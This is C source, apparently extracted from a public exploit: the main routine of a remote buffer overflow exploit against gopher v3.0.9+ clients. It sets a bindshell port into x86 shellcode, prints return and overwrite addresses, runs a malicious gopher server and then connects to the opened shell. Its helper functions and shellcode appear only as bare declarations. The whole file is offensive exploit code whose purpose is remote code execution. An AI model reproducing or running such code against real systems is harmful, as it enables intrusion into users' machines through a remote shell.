
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 unsigned short DFL_BINDSHELL_PORT ;
 int PLACEMENT_OFFSET ;
 int REPLACE_VI_ADDR ;
 int RET_ADDR ;
 unsigned short atoi (char*) ;
 int exit (int) ;
 int getshell (char*,unsigned short) ;
 char* gopherd_bind (unsigned short) ;
 int printf (char*,...) ;
 int sleep (int) ;
 unsigned short* x86_exec ;

int main(int argc,char **argv){
unsigned short port=0,sport=DFL_BINDSHELL_PORT;
char *hostptr;
printf("[*] gopher[v3.0.9+]: remote (client) buffer overflow exp"
"loit.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
if(argc<2){
printf("[!] syntax: %s <port> [bindshell port]\n",argv[0]);
exit(1);
}
port=atoi(argv[1]);
if(argc>2)sport=atoi(argv[2]);


x86_exec[20]=(sport&0xff00)>>8;
x86_exec[21]=(sport&0x00ff);


printf("[*] replacement \"vi\" address\t\t: 0x%.8x\n",REPLACE_VI_ADDR);
printf("[*] return address\t\t\t: 0x%.8x\n",RET_ADDR);
printf("[*] offset from the end of tmpstr[]\t: %d (=%d)\n",
PLACEMENT_OFFSET,PLACEMENT_OFFSET*4);
printf("[*] server port\t\t\t\t: %u\n",port);
printf("[*] bindshell port\t\t\t: %u\n\n",sport);


hostptr=gopherd_bind(port);


sleep(3);


getshell(hostptr,sport);

exit(0);
}
